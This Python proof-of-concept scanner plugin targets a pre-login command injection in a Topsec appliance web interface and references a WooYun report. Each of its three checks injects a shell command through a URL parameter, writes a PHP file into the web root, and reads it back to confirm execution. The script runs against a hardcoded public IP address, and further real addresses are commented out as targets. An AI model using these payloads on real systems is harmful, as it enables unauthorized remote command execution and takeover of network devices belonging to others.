#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 天融信某系统前台无需登录命令执行3处
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0117616

"""

import urlparse
def assign(service, arg):
    if service == 'topsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    payload = 'acc/network/redial_pppoe.php?wan=%20|%20echo%20testvul%20>%20test.php%20|'
    #payload = 'acc/debug/bytecache_run_action.php?action=1&engine=%20|%20echo%20bugscan%20>%20a.php%20|%20&ipfilter=10'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    payload='acc/network/test.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvul' in res:
        security_hole(target)
  
    payload="acc/network/interface/check_interface_stat.php?eth=%20|%20echo%20testvul%20>%20testh.php%20|"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target);
    payload='acc/network/interface/testh.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvul' in res:
        security_hole(target)

        
    payload='acc/fdisk/fdisk_action.php?action=1&diskname=1%20|%20echo%20testvul%20>%20testc.php%20|%20&setTosize=10'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    payload='acc/fdisk/testc.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvul' in res:
        security_hole(target)
        


if __name__ == '__main__':
    from dummy import *
    # audit(assign('topsec', 'http://61.54.222.33:8080/')[1])
    audit(assign('topsec', 'http://61.148.24.182/')[1])
    # audit(assign('topsec', 'http://218.206.217.19:8080/')[1])
    # audit(assign('topsec', 'http://61.54.222.39:8080/')[1])